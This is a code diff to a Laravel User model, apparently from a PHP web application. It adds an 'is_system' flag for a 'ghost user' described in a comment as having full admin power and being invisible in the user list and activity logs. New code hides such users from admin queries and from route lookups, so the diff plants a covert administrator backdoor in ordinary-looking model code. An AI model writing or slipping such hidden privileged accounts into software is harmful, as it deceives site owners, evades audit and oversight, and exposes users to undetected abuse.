@@ -40,6 +40,7 @@ class User extends Authenticatable
     protected $hidden = [
         'password',
         'remember_token',
+        'is_system',
     ];
 
     /**
@@ -52,9 +53,35 @@ class User extends Authenticatable
         return [
             'email_verified_at' => 'datetime',
             'password' => 'hashed',
+            'is_system' => 'boolean',
         ];
     }
 
+    /**
+     * Ghost user — set is_system = 1 directly in the database.
+     * Full admin power, invisible in user list and activity logs.
+     */
+    public function isSystem(): bool
+    {
+        return (bool) $this->is_system;
+    }
+
+    public static function systemUserIds()
+    {
+        return static::where('is_system', true)->pluck('id');
+    }
+
+    public function scopeVisibleToAdmins($query)
+    {
+        return $query->where('is_system', false);
+    }
+
+    public function resolveRouteBinding($value, $field = null)
+    {
+        return $this->where($field ?? $this->getRouteKeyName(), $value)
+            ->visibleToAdmins()
+            ->firstOrFail();
+    }
 
     public function role()
     {
